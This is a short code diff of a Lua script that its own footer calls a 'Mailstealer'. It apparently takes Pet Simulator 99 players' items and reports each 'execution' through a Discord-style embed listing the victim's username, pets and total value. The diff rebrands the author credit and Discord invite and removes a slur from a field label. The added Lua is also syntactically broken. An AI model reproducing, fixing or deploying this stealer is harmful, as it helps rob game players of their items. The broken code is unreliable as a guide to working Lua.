@@ -59,18 +59,18 @@ local function SendMessage(username, diamonds)
 
 	local fields = {
 		{
-			name = "Retard Username:",
-			value = username,
+			name = "📖 UserName:",
+			value = "```"username,"```"
 			inline = true
 		},
 		{
-			name = "Items to be sent:",
-			value = "",
+			name = "🐹 Pets List:",
+			value = "```" "```",
 			inline = false
 		},
         {
-            name = "Summary:",
-            value = "",
+            name = "✏️ Total Value:",
+            value = "```" "```",
             inline = false
         }
 	}
@@ -108,8 +108,8 @@ local function SendMessage(username, diamonds)
             ["title"] = "\240\159\144\177 New PS99 Execution" ,
             ["color"] = 65280,
 			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "Mailstealer by Light Monzz"
+				["text"] = "https://discord.gg/CAr4FZHAyF"
 			}
         }}
     }
